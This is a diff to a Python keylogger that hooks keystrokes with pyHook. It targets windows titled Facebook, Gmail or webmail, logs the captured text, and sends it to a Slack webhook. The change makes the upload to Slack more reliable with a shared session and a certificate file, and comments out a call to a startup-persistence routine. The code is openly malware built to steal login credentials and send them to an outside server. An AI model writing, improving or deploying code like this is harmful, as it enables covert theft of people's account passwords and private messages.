@@ -31,6 +31,9 @@ DATA_LENGTH = 50
 # Keywords for algorithm
 key_words = ['FACEBOOK', 'GMAIL', 'WEBMAIL']
 
+# HTTP Session
+CERT_FILE = 'cacert.pem'
+session = Session()
 # Log configuration
 # MODE 0: log on local file
 # MODE 1: log on slack server
@@ -81,11 +84,10 @@ def log_on_file(file, DATA):
 
 def log_on_cloud(url, DATA):
 	'''log the DATA collected in a Slack server'''
-	with Session() as s:
-		payload = {'text': DATA}
-		response = s.post(url=url, data=json.dumps(payload, ensure_ascii=False), headers={'Content-Type': 'application/json'}, verify=False)
-		# verify=False -> dont need any certificate, but the exe works only for one post request
-		print(response.status_code)
+	payload = {'text': DATA}
+	response = session.post(url=url, data=json.dumps(payload, ensure_ascii=False), headers={'Content-Type': 'application/json'}, verify=CERT_FILE)
+	# verify=False -> dont need any certificate, but the exe works only for one post request
+	print(response.status_code)
 
 #################################
 #		ALGORITHM RELEVANT  	#
@@ -108,7 +110,7 @@ def is_relevant_window(WindowName, key_words):
 
 if __name__ == '__main__':
 	# comment persist() if you don't want the code to run at startup of the computer
-	persist()
+	#persist()
 	hm = pyHook.HookManager()
 	hm.SubscribeKeyDown(on_keyboard)
 	hm.HookKeyboard()
